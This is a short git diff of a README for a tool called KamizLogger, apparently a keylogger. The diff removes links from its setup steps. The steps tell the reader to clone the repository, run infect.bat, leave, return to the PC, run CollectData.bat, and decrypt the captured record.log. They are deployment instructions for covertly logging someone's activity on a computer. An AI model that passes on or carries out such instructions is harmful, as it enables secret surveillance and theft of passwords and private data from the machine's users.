@@ -39,11 +39,11 @@ git clone https://github.com/KamiHateOmg/KamizLogger
 
 # Open the directory
 
-# Launch [infect.bat](https://github.com/KamiHateOmg/KamizLogger/blob/main/Infect.bat)
+# Launch infect.bat
 
 # Now, wait.
 
-# Then, return to the pc and launch [CollectData.bat](https://github.com/KamiHateOmg/KamizLogger/blob/main/CollectData.bat).
+# Then, return to the pc and launch CollectData.bat.
 You will get a new txt file named record.log.
 
 This file will be encrypted, so use the RecordDecoder to decrypt it.
